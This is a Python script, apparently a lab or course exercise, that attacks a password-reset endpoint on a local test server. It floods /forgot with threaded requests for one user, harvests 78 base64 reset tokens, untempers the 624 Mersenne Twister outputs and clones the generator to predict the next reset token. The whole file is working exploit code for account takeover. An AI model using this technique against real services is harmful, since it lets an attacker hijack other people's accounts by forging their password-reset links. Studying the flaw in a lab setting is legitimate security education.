import requests
import re
import base64
import MT19937
import bit_utility
import queue
import threading


# takes in the amount of tokens you want to predict
def demo_taskII(n):
    token_array = obtain_tokens()
    state = []
    for token in token_array:
        token_to_integers(token, state)

    # unmixes each of the 624 32 bit tokens
    unmixed_state = unmix_tokens(state)

    # clones the Mersenne Twister prg using the initial state
    prg = clone_initial_state(unmixed_state)

    # print out extracted token to compare to original password reset token
    print("\nNext predicted tokens are : ")
    for i in range(n):
        print(predict_token(prg))


def obtain_tokens_helper(url, data, headers, results_queue):
    response = requests.post(url, data=data, headers=headers)
    results_queue.put(response)


# obtains 78 tokens from the website using threading for sending multiple requests
# implements a queue to maintain consequential order of tokens requested
def obtain_tokens():
    url = 'http://localhost:8080/forgot'
    data = {'user': 'KevinEmail'}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    tokens = []

    # create a queue to store tokens
    results_queue = queue.Queue()

    # create threads for sending requests
    threads = []
    for i in range(78):  # Adjust the number of threads as needed
        thread = threading.Thread(target=obtain_tokens_helper, args=(url, data, headers, results_queue))
        thread.start()
        threads.append(thread)

    # wait for all threads to complete
    for thread in threads:
        thread.join()

    # process responses in consequential order
    while not results_queue.empty():
        response = results_queue.get()
        token_match = re.search(r'localhost:8080/reset\?token=([A-Za-z0-9+/]+)', response.text)
        if token_match:
            token = token_match.group(1)
            # add padding if needed
            while len(token) % 4 != 0:
                token += '='
            tokens.append(token)
            print(token)

    return tokens


# takes in a MT19937 instance and extracts outputs
def predict_token(prg):
    # we will have an ascii representation of the bytes
    predicted_token = ""
    for i in range(8):
        # extract a value and append the string representation
        predicted_value = prg.extract_number()
        predicted_token += str(predicted_value)
        if i < 7:
            predicted_token += ":"  # Add colon between sections

    # convert the token back to bytes
    predicted_token = utf8_to_bytes(predicted_token)

    # encode the token into base 64
    return base64.b64encode(predicted_token)


# converts a password reset token into 8 32-bit integers
def token_to_integers(token, state):
    # Decode the base64-encoded string to obtain the byte data
    byte_data = bit_utility.base64_to_bytes(token)

    # turn the token into 8 integers that will be unmixed
    state_values = parse_token(byte_data)
    for value in state_values:
        state.append(value)

    return state_values


# turn the bytes into numbers - using the colon as a separation point
def parse_token(data_bytes):
    # Convert bytes data to string
    data_str = data_bytes.decode('utf-8')

    # Split the string into sections using the colon as the delimiter
    sections = data_str.split(':')

    # Convert sections to integers
    return [int(section) for section in sections]


# unmixes each of the 624 32 bit tokens
def unmix_tokens(values):
    state = []
    for value in values:
        state.append(MT19937.unmix_value(value))
    return state


# clones the prg using the initial state as input
def clone_initial_state(state):
    return MT19937.MTClone(state)


# Convert the UTF-8 string to bytes
def utf8_to_bytes(utf8_string):
    return utf8_string.encode('utf-8')


demo_taskII(1)
